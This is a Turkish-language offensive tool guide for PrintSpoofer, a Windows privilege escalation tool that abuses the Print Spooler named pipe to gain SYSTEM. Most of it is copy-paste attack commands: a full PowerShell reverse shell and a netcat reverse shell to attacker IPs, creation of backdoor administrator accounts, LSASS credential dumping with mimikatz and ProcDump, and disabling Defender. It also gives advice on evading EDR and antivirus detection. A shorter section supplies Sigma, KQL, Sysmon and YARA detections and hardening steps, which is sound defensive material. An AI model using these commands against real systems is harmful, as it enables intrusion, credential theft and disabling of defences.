# PrintSpoofer

> **Kategori:** [15. YEREL YETKİ YÜKSELTME (LPE) VE POTATO AİLESİ](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows 10 ve Windows Server 2016/2019/2022 sistemlerde `SeImpersonatePrivilege` yetkisini Print Spooler Named Pipe mekanizması üzerinden istismar ederek `NT AUTHORITY\SYSTEM` haklarına sıçrayan yüksek performanslı yerel yetki yükseltme (LPE) aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında servis hesapları (örneğin IIS Application Pool hesapları olan `IIS APPPOOL\DefaultAppPool`, Microsoft SQL Server servis hesapları veya MSSQL `sa` kullanıcısının `xp_cmdshell` oturumları) genellikle kısıtlı yerel yetkilere sahip olsa da işletim sistemi çekirdeği düzeyinde `SeImpersonatePrivilege` veya `SeAssignPrimaryTokenPrivilege` kullanıcı haklarına (user rights) sahiptir. Geçmişte bu haklar RottenPotato ve JuicyPotato gibi araçlarla DCOM/OXID RPC mekanizması üzerinden istismar edilmekteydi. Ancak Microsoft, Windows 10 sürüm 1809 ve Windows Server 2019 ile birlikte DCOM arayüzünün yerel loopback adreslerine (127.0.0.1) yönlendirilmesini engelleyen güvenlik kontrolleri (DCOM hardening) getirerek klasik JuicyPotato tekniklerini işlevsiz kılmıştır.

Güvenlik araştırmacısı Itamar Sher (@itm4n) tarafından 2020 yılında geliştirilen **PrintSpoofer**, Windows Yazdırma Biriktiricisi (`spoolsv.exe`) servisinin tasarım mantığındaki bir istisnayı kullanarak modern Windows işletim sistemlerinde bu engelleri aşmaktadır. PrintSpoofer, yerel bir Adlandırılmış Boru (Named Pipe) sunucusu ayağa kaldırır ve `RpcRemoteFindFirstPrinterChangeNotificationEx` API çağrısı ile Print Spooler servisini bu boruya bağlanmaya zorlar. Print Spooler servisi `NT AUTHORITY\SYSTEM` kimliğiyle çalıştığından, saldırgan adlandırılmış boruyu yakalar, `ImpersonateNamedPipeClient` API'si ile gelen istemcinin kimliğine bürünür ve elde ettiği SYSTEM belirtecini (token) çoğaltarak (`DuplicateTokenEx`) tam yetkili bir komut satırı veya ikili dosya çalıştırır.

```
+---------------------------------------------------------------------------------------------------+
|                            PRINTSPOOFER ÇALIŞMA VE YETKİ YÜKSELTME AKIŞI                          |
+---------------------------------------------------------------------------------------------------+

 [ Düşük Yetkili Servis Oturumu ]
 (IIS APPPOOL, MSSQL vb. - SeImpersonatePrivilege Aktif)
             │
             ├─► 1. Adlandırılmış Boru Sunucusu Açar: \\.\pipe\x\pipe\spoolss
             │
             ├─► 2. RpcOpenPrinter ve RpcRemoteFindFirstPrinterChangeNotificationEx Çağırır
             │      (Hedef: \\localhost\pipe\x)
             │
             ▼
 [ Windows Print Spooler (spoolsv.exe - NT AUTHORITY\SYSTEM) ]
             │
             ├─► 3. Gelen RPC bildirim talebini işler
             │      Path Çözümleme: "\\localhost/pipe/x" -> "\\localhost\pipe\x\pipe\spoolss"
             │
             ├─► 4. Named Pipe'a SYSTEM Güvenlik Bağlamında Bağlanır (Connect)
             │
             ▼
 [ PrintSpoofer Dinleyicisi ]
             │
             ├─► 5. ImpersonateNamedPipeClient() çağrısı ile SYSTEM Token'ını yakalar
             │
             ├─► 6. DuplicateTokenEx() ile Primary Token üretir
             │
             └─► 7. CreateProcessWithTokenW() veya CreateProcessAsUserW() çalıştırır
                    │
                    ▼
          [ NT AUTHORITY\SYSTEM Shell / Komut Yürütme Başarılı ]
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **DCOM Port Bağımsızlığı** | DCOM arayüzüne veya 135/PORT dinleyicilerine ihtiyaç duymaz; yerel Named Pipe mimarisini kullanır. |
| **Windows 10/11 ve Server 2016-2022 Uyumluluğu** | JuicyPotato'nun engellendiği tüm modern Windows sürümlerinde doğrudan çalışır. |
| **İnteraktif Konsol Desteği** | Ters bağlantı (reverse shell) açmaya gerek kalmadan mevcut konsol oturumunu doğrudan SYSTEM shell'e yükseltebilir (`-i`). |
| **Düşük Bellek ve Bağımlılık İzi** | Harici DLL veya framework gerektirmez; saf C++ Win32 API çağrılarıyla tek bir hafif PE (.exe) dosyasıdır. |
| **Servis Bağımlılığı** | Yalnızca `Spooler` servisinin çalışır durumda olmasını gerektirir (varsayılan olarak etki alanı sunucularının çoğunda açıktır). |

### Yazdırma Biriktiricisi Yol Doğrulama Zafiyeti (Path Validation Flaw)

Print Spooler mekanizmasının istismar edilmesini sağlayan temel zafiyet, `spoolsv.exe` servisinin hedef sunucu adını ve boru yolunu doğrulama biçiminden kaynaklanır. Normal şartlarda servis, yalnızca `\\.\pipe\spoolss` adlandırılmış borusuna bağlanmayı kabul eder. Ancak:
1. `RpcOpenPrinter` çağrısı ile yerel makineye bağlanıldığında hedef parametre olarak `\\localhost/pipe/x` girildiğinde, Windows yol ayrıştırıcısı ters eğik çizgi (`\`) yerine düz eğik çizgi (`/`) karakterini bir alt dizin veya dosya adı olarak kabul eder.
2. Yazdırma bildirim alt sistemi (`RpcRemoteFindFirstPrinterChangeNotificationEx`), hedef bilgisayar adına otomatik olarak `\pipe\spoolss` ekler.
3. Bu iki bileşenin birleşimi sonucu oluşan nihai yol `\\localhost/pipe/x\pipe\spoolss` biçimine dönüşür.
4. Windows Dosya Sistemi (SMB ve Named Pipe sürücüsü `npfs.sys`), düz eğik çizgileri ters eğik çizgiye çevirerek bu yolu standart bir UNC boru yoluna dönüştürür: `\\localhost\pipe\x\pipe\spoolss`.
5. Bu sayede düşük yetkili saldırgan, `\\.\pipe\x\pipe\spoolss` adında kendi oluşturduğu adlandırılmış boruya Print Spooler servisinin `NT AUTHORITY\SYSTEM` güvenlik bağlamında bağlanmasını sağlar.

### Alternatif Yetki Yükseltme Araçlarıyla Karşılaştırma

| Kriter | PrintSpoofer | JuicyPotato | SweetPotato | GodPotato |
|:---|:---|:---|:---|:---|
| **Kullanılan Vektör** | Print Spooler Named Pipe | DCOM / BITS OXID | DCOM + BITS + Spooler | DCOM IStorage COM Activation |
| **Win Server 2019 Desteği** | ✅ Tam Destek | ❌ Engellendi (Hardened) | ✅ Destekler | ✅ Tam Destek |
| **Win Server 2022 Desteği** | ✅ Tam Destek | ❌ Engellendi | ✅ Kısmi | ✅ Tam Destek |
| **Print Spooler Zorunluluğu**| ✅ Zorunlu | ❌ Gerekmez | ❌ Alternatifleri var | ❌ Gerekmez |
| **İnteraktif Konsol** | ✅ Var (`-i`) | ❌ Yok | ❌ Yok | ❌ Yok |
| **Gereken Ayrıcalık** | SeImpersonate / SeAssignPrimary | SeImpersonate / SeAssignPrimary | SeImpersonate / SeAssignPrimary | SeImpersonate / SeAssignPrimary |

---


## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PrintSpoofer komut satırı arayüzü son derece yalın ve operasyonel odaklıdır. Komut yürütme modu (`-c`) veya interaktif terminal modu (`-i`) olmak üzere iki temel çalışma biçimi sunar.

```cmd
PrintSpoofer.exe [SEÇENEKLER]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Kullanım Türü | Örnek Değer |
|:---|:---|:---|:---|
| `-c <komut>` | Belirtilen komut satırını veya çalıştırılabilir dosyayı `SYSTEM` haklarıyla arka planda yürütür. | Komut Yürütme | `-c "cmd.exe /c whoami"` |
| `-i` | Mevcut konsol standart girdi/çıktı (stdin/stdout/stderr) akışlarını SYSTEM sürecine yönlendirerek interaktif kabuk açar. | İnteraktif Kabuk | `-i -c cmd.exe` |
| `-d <id>` | Yeni oluşturulacak sürecin başlatılacağı Windows Oturum Kimliği (Session ID). GUI oturumlarına etkileşimli pencere açmak için kullanılır. | Oturum Yönlendirme | `-d 1 -c cmd.exe` |
| `-p <ad>` | Özel bir adlandırılmış boru (Named Pipe) taban ismi tanımlar. Varsayılan pipe adı yerine EDR alarmlarını atlatmak için kullanılır. | OPSEC / Evasion | `-p SecurityAuditPipe` |
| `-h` | Kullanım yardımını ve sürüm bilgilerini ekrana basar. | Bilgi | `-h` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Temel Hak Kontrolü ve Yetki Denetimi
Bir web shell veya SQL enjeksiyonu üzerinden oturum elde edildiğinde ilk olarak kullanıcının `SeImpersonatePrivilege` hakkına sahip olup olmadığı denetlenmelidir.

```cmd
whoami /priv
```

```text
GİZLİLİK BİLGİLERİ
-------------------
Ayrıcalık Adı                 Açıklama                                    Durum
============================= =========================================== ========
SeAssignPrimaryTokenPrivilege Birincil düzey belirteci değiştir           Devre Dışı
SeIncreaseQuotaPrivilege      İşlem için bellek kotalarını ayarla         Devre Dışı
SeChangeNotifyPrivilege       Geçiş denetimini atla                       Etkin
SeImpersonatePrivilege        Kimlik doğrulamasından sonra istemciyi taklit Etkin
SeCreateGlobalPrivilege       Genel nesneler oluştur                      Etkin
```

### Senaryo 2: Doğrudan İnteraktif SYSTEM Shell Elde Etme
WinRM, SSH veya interaktif bir komut istemcisi üzerinden bağlıyken ek bir porta ters bağlantı açmaya gerek kalmadan mevcut oturum anında `NT AUTHORITY\SYSTEM` konsoluna dönüştürülür.

```cmd
C:\Windows\Temp\PrintSpoofer.exe -i -c cmd.exe
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessWithTokenW() OK
Microsoft Windows [Version 10.0.17763.1577]
(c) 2018 Microsoft Corporation. Tüm hakları saklıdır.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> whoami /priv | findstr Impersonate
SeImpersonatePrivilege        Kimlik doğrulamasından sonra istemciyi taklit Etkin
```

### Senaryo 3: Arka Planda Yeni Yerel Yönetici Hesabı Oluşturma
Web shell veya kör komut yürütme (blind RCE) ortamlarında terminal etkileşimi kurulamıyorsa doğrudan arka planda bir yerel yönetici hesabı oluşturulabilir.

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "cmd.exe /c net user BackdoorAdmin P@ssw0rd123! /add && net localgroup Administrators BackdoorAdmin /add"
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessWithTokenW() OK
```

### Senaryo 4: Ters Bağlantı (Reverse Shell) Başlatma
Güvenlik duvarı giden (egress) bağlantılara izin veriyorsa, yetkili bir PowerShell ters bağlantısı saldırgan makinesine yönlendirilir.

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.50',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
```

Saldırgan dinleyicisindeki çıktı:
```text
listening on [any] 4444 ...
connect to [192.168.1.50] from (UNKNOWN) [192.168.1.200] 49832
PS C:\Windows\system32> whoami
nt authority\system
```

### Senaryo 5: GUI Oturumuna Etkileşimli Pencere Enjekte Etme (Session Hijacking / Injection)
Hedef makinede oturum açmış bir sistem yöneticisinin RDP masaüstüne (örneğin Session 1) doğrudan SYSTEM haklarıyla çalışan interaktif bir komut istemcisi açılır.

```cmd
query user
C:\Windows\Temp\PrintSpoofer.exe -d 1 -c "cmd.exe"
```

```text
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#0           1  Active          .  14.10.2026 10:15

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] Process created in Session 1
```

### Senaryo 6: Bellekten Mimikatz ile Kimlik Bilgilerini Dökme
SYSTEM hakları elde edildikten sonra LSASS bellek alanını doğrudan dump etmek üzere komut tetiklenir.

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > C:\Windows\Temp\dump.txt"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `[-] A privilege is missing: SeImpersonatePrivilege` | Mevcut oturum kullanıcısı servis hesabı değildir ve token taklit ayrıcalığı bulunmamaktadır. | Oturumun bir servis hesabı (`IIS APPPOOL`, `MSSQLSERVER`, `LOCAL SERVICE`) olup olmadığını `whoami /priv` ile kontrol edin; standart kullanıcıysa farklı bir LPE vektörü (CVE, unquoted service path vb.) deneyin. |
| `[-] Cannot open printer: 1722 (RPC Server is unavailable)` | Windows Print Spooler servisi (`spoolsv.exe`) durdurulmuş veya devre dışı bırakılmıştır. | `sc.exe query spooler` ile servisi denetleyin. Servis kapalıysa PrintSpoofer çalışmaz; alternatif olarak `GodPotato` veya `SweetPotato` aracına geçin. |
| `[-] CreateProcessWithTokenW() failed with error: 1314` | Süreç `SeImpersonatePrivilege` sahibidir ancak `CreateProcessWithTokenW` için gereken `SeAssignPrimaryTokenPrivilege` eksiktir veya kısıtlanmıştır. | Aracın güncel derlemesini kullanarak `CreateProcessAsUserW` mekanizmasını tetikleyin ya da Win32 API çağrısını doğrudan yürüten script varyantlarını tercih edin. |
| `[-] ConnectNamedPipe() timed out` | Print Spooler RPC çağrısı adlandırılmış boruyu çözümleyemedi veya boru adı çakışması yaşandı. | `-p` parametresi ile rastgele ve benzersiz bir pipe adı belirtin (`-p CustomPipe123`). Loopback DNS çözümlemesinin çalıştığını doğrulayın. |
| `Access is denied (0x5)` çalıştırılan komut başarısız oldu | EDR veya Defender, `spoolsv.exe`'nin alt süreç oluşturmasını veya belleğe inject olmasını engellemektedir. | Komutu doğrudan `cmd.exe` olarak çağırmak yerine bir bat dosyası içine yazıp çağırın veya parent PID spoofing destekleyen loader'lar kullanın. |
| Komut çalışıyor ancak çıktı dönmüyor | İnteraktif bayrak (`-i`) verilmeden konsol komutları çağrılmıştır. | Konsolda çıktı görmek için `-i` parametresini ekleyin veya çıktıyı bir dosyaya yönlendirin (`-c "cmd.exe /c whoami > C:\temp\out.txt"`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                              PRINTSPOOFER TESPİT VE GÖZLEMLENEBİLİRLİK                            |
+---------------------------------------------------------------------------------------------------+

 [ Named Pipe Oluşturma ]
  - Pipe İsmi: \\.\pipe\*\pipe\spoolss  ========> Sysmon Event ID 17/18 (Pipe Created/Connected)
  - Anormal Pipe Deseni (\pipe\ içinde \pipe\)

 [ RPC Çağrısı ve Servis Etkileşimi ]
  - spoolsv.exe yerel boruya bağlanır   ========> EDR Davranışsal Analizi (Anormal spoolsv bağlantısı)

 [ Süreç Üretimi ve Token Manipülasyonu ]
  - Parent Process: spoolsv.exe veya servis  ===> Sysmon Event ID 1 (Process Create)
  - User: NT AUTHORITY\SYSTEM           ========> Anormal Alt Süreç (w3wp.exe -> cmd.exe [SYSTEM])
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sysmon Event ID 1 (Process Creation):** Servis kullanıcı hesabı bağlamında (örn. `IIS APPPOOL\DefaultAppPool`) çalışan bir sürecin aniden `NT AUTHORITY\SYSTEM` kimliğiyle `cmd.exe`, `powershell.exe` veya yetkili bir ikili dosya türetmesi en belirgin IOC'dir.
* **Sysmon Event ID 17 & 18 (Pipe Created / Pipe Connected):** PrintSpoofer varsayılan olarak boru yolunda `\pipe\spoolss` yapısını kullanır. Dosya sistemi borularında çift "pipe" içeren yolların oluşturulması kural tabanlı tespit sağlar.
* **Windows Security Event ID 4624 (Logon):** `NT AUTHORITY\SYSTEM` adına Logon Type 2 veya Type 0 ile yeni oturum açılışları kaydedilir.
* **Windows Security Event ID 4672 (Special Privileges Assigned):** Yeni başlatılan sürece `SeTcbPrivilege`, `SeDebugPrivilege` gibi kritik hakların atandığını raporlar.

### 5.2 Ağ ve EDR İmzaları
* PrintSpoofer ağ trafiği üretmez; tamamen yerel RPC ve Named Pipe IPC katmanında gerçekleşir.
* Modern EDR yazılımları, `spoolsv.exe` sürecinin yerel bir pipe dinleyicisine erişmesini ve ardından gelen `ImpersonateNamedPipeClient` çağrısını şüpheli davranışsal zincir olarak işaretler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Privilege Escalation** | `T1134.001` | Access Token Manipulation: Token Impersonation/Theft | `ImpersonateNamedPipeClient` ve `DuplicateTokenEx` ile SYSTEM belirtecini ele geçirme. |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | Print Spooler tasarım mantığını istismar ederek yerel yetki yükseltme. |
| **Execution** | `T1059.003` | Command and Scripting Interpreter: Windows Command Shell | Elde edilen SYSTEM belirteciyle komut istemcisi yürütme. |
| **Defense Evasion** | `T1134.002` | Create Process with Token | `CreateProcessWithTokenW` API'si ile güvenlik bağlamını değiştirme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Standart Pipe Adı Tespiti | **YÜKSEK** | Kod derlenirken veya CLI üzerinden pipe adı desenini değiştirin; içinde `spoolss` geçmeyen meşru görünümlü boru adları tanımlayın. |
| Şüpheli Alt Süreç Türetimi | **KRİTİK** | Doğrudan `w3wp.exe -> cmd.exe (SYSTEM)` zinciri oluşturmak yerine, komutu meşru bir Windows ikilisine (LOLBin) enjekte edin veya BOF/in-memory loader kullanın. |
| Disk İmzası (Static Binary) | **ORTA** | Standart GitHub release derlemeleri bilinen Defender imzalarına takılır. Kodu kaynak koddan değişken isimleri ve stringler gizlenerek (obfuscation) yeniden derleyin. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & Sentinel KQL)

#### Sigma Kuralı (Sysmon Named Pipe İstismarı):
```yaml
title: PrintSpoofer Named Pipe Impersonation Detection
id: 8b066cf8-07e3-4f9e-a1e4-e3c79e600fa2
status: experimental
description: Detects pipe creation and connection patterns typical of PrintSpoofer exploitation.
logsource:
  category: pipe_created
  product: windows
detection:
  selection:
    PipeName|contains:
      - '\pipe\spoolss'
      - '\pipe\test\pipe'
  condition: selection
falsepositives:
  - Rare legitimate printing diagnostic tools
level: high
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
SecurityEvent
| where EventID == 4688
| where ProcessCommandLine has_any ("PrintSpoofer", "PrintSpoofer.exe") or 
        (ParentProcessName has_any ("w3wp.exe", "sqlservr.exe") and AccountType == "User" and TargetUserName == "SYSTEM")
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, ParentProcessName, NewProcessName, CommandLine
```

#### Sysmon XML Yapılandırma Filtresi:
```xml
<!-- Sysmon Event ID 17/18 Filtresi: Anormal Named Pipe Tespiti -->
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <RuleGroup name="PrintSpoofer Detection" groupRelation="or">
      <PipeEvent onmatch="include">
        <PipeName condition="contains">\pipe\spoolss</PipeName>
        <PipeName condition="contains">\pipe\test\pipe</PipeName>
      </PipeEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

#### Incident Response (IR) PowerShell Olay İnceleme Betiği:
```powershell
# Print Spooler anomalilerini ve şüpheli alt süreçleri sorgulama
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 100 | Where-Object {
    $_.Properties[19].Value -match "spoolss" -or 
    ($_.Properties[21].Value -match "w3wp.exe|sqlservr.exe" -and $_.Properties[4].Value -eq "NT AUTHORITY\SYSTEM")
} | Select-Object TimeCreated, @{N='User';E={$_.Properties[4].Value}}, @{N='Image';E={$_.Properties[21].Value}}, @{N='CommandLine';E={$_.Properties[10].Value}}
```

#### YARA Kuralı (Statik İkili Tespiti):
```yara
rule HackTool_MSIL_PrintSpoofer_Strings {
    meta:
        description = "Detects PrintSpoofer privilege escalation executable"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/itm4n/PrintSpoofer"
    strings:
        $s1 = "RpcRemoteFindFirstPrinterChangeNotificationEx" ascii wide
        $s2 = "CreateProcessWithTokenW" ascii wide
        $s3 = "ImpersonateNamedPipeClient" ascii wide
        $s4 = "\\\\.\\pipe\\%s\\pipe\\spoolss" ascii wide
        $s5 = "[+] Found privilege: SeImpersonatePrivilege" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **Spooler Servisini Kapatma:** Active Directory etki alanı denetleyicilerinde (DC) ve baskı işlevi görmeyen IIS/veritabanı sunucularında Print Spooler servisi tamamen kapatılmalı ve devre dışı bırakılmalıdır:
  ```powershell
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
* **Kullanıcı Hakları Atamasını Sıkılaştırma:** `SeImpersonatePrivilege` hakkı yalnızca gerçekten ihtiyaç duyan hesaplara tahsis edilmeli, IIS ve SQL servis hesapları grup ilkeleri (GPO) üzerinden denetlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Yetki Kontrolü Gerçekleştirme
```cmd
whoami /priv | findstr Impersonate
```
* **Ne Yapar?:** Mevcut kullanıcının token taklit yetkisine sahip olup olmadığını doğrular.
* **Ne Zaman Kullanılır?:** PrintSpoofer çalıştırmadan önce sistemin uygunluğunu kontrol etmek için.
* **Parametreler:** `whoami /priv`.

#### 2. İnteraktif SYSTEM CMD Oturumu Açma
```cmd
PrintSpoofer.exe -i -c cmd.exe
```
* **Ne Yapar?:** Mevcut terminal penceresinde doğrudan tam yetkili SYSTEM komut istemcisi başlatır.
* **Ne Zaman Kullanılır?:** WinRM veya SSH oturumu sağlandığında hızlıca yetki yükseltmek için.
* **Parametreler:** `-i` (interaktif), `-c cmd.exe` (çalıştırılacak kabuk).

#### 3. İnteraktif SYSTEM PowerShell Oturumu Açma
```cmd
PrintSpoofer.exe -i -c "powershell.exe -NoLogo"
```
* **Ne Yapar?:** PowerShell ortamını SYSTEM bağlamında etkileşimli olarak açar.
* **Ne Zaman Kullanılır?:** Gelişmiş betik çalıştırma ve AD modüllerini yönetmek için.
* **Parametreler:** `-i`, `-c`.

#### 4. Yerel Yönetici Hesabı Ekleme (Non-Interactive)
```cmd
PrintSpoofer.exe -c "net user svc_adm P@ss123456! /add && net localgroup administrators svc_adm /add"
```
* **Ne Yapar?:** Arka planda kalıcı bir yerel yönetici hesabı oluşturur.
* **Ne Zaman Kullanılır?:** Web shell üzerinden doğrudan komut gönderirken.
* **Parametreler:** `-c` (arka plan komutu).

#### 5. SYSTEM Yetkisiyle Ters Bağlantı (Netcat/Socat) Tetikleme
```cmd
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"
```
* **Ne Yapar?:** Netcat ikilisini SYSTEM yetkisiyle saldırgan IP adresine yönlendirir.
* **Ne Zaman Kullanılır?:** Dışarıya giden bağlantı açıksa bağımsız bir ters kabuk almak için.
* **Parametreler:** `-c <payload>`.

#### 6. Konsol Çıktısını Dosyaya Yönlendirme
```cmd
PrintSpoofer.exe -c "cmd.exe /c whoami /all > C:\Windows\Temp\sys_privs.txt"
```
* **Ne Yapar?:** SYSTEM token'ının tüm ayrıcalıklarını ve grup üyeliklerini metin dosyasına kaydeder.
* **Ne Zaman Kullanılır?:** Çıktıların web shell ekranına yansımadığı kör (blind) ortamlarda.
* **Parametreler:** `cmd.exe /c ... > out.txt`.

#### 7. Özel Pipe Adı Tanımlayarak OPSEC İyileştirme
```cmd
PrintSpoofer.exe -p "CustomDiagnosticPipe" -i -c cmd.exe
```
* **Ne Yapar?:** Standart boru adları yerine özel tanımlı boru adı üzerinden taklit sürecini yürütür.
* **Ne Zaman Kullanılır?:** Varsayılan boru isimlerini izleyen EDR kurallarını atlatmak için.
* **Parametreler:** `-p <pipe_adi>`, `-i`, `-c`.

#### 8. RDP Masaüstü Oturumuna SYSTEM Konsolu Fırlatma
```cmd
PrintSpoofer.exe -d 1 -c "cmd.exe"
```
* **Ne Yapar?:** ID 1 numaralı aktif masaüstü kullanıcı oturumuna görsel bir CMD penceresi enjekte eder.
* **Ne Zaman Kullanılır?:** Hedef ekranda kullanıcı GUI oturumu açıkken etkileşim kurmak için.
* **Parametreler:** `-d <session_id>`.

#### 9. Windows Defender Gerçek Zamanlı Korumasını Kapatma
```cmd
PrintSpoofer.exe -c "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true"
```
* **Ne Yapar?:** SYSTEM haklarıyla Defender gerçek zamanlı korumasını devre dışı bırakır.
* **Ne Zaman Kullanılır?:** Zararlı yüklerin veya araçların diskte engellenmesini önlemek için.
* **Parametreler:** `Set-MpPreference -DisableRealtimeMonitoring $true`.

#### 10. LSASS Belleğini Sysinternals ProcDump ile Alma
```cmd
PrintSpoofer.exe -c "C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp"
```
* **Ne Yapar?:** LSASS sürecinin tam bellek dökümünü güvenli bir şekilde diske yazar.
* **Ne Zaman Kullanılır?:** Parola hash'lerini ve Kerberos biletlerini çevrimdışı incelemek için.
* **Parametreler:** `-c` parametresi içinde ProcDump komutu.

---

## Kaynaklar

* [Itamar Sher (itm4n) Resmi GitHub Deposu: PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [Itamar Sher Blog Yazısı: PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonation-privileges/)
* [Microsoft Dokümantasyonu: [MS-RPRN] Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)
* [The Hacker Recipes: Impersonation Privileges (PrintSpoofer)](https://www.thehacker.recipes/a-d/movement/privilege-escalation/impersonation)
* [HackTricks: Windows Impersonation Privileges](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)
* [MITRE ATT&CK: Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/)

---

> **Önceki:** [← ROADtools / roadrecon (Kategori 14)](../Kategori_14_AD_FS_Bulut_ve_Hibrit_Kimlik/ROADtools_roadrecon.md) · **Sonraki:** [SweetPotato / JuicyPotatoNG →](./SweetPotato_JuicyPotatoNG.md)
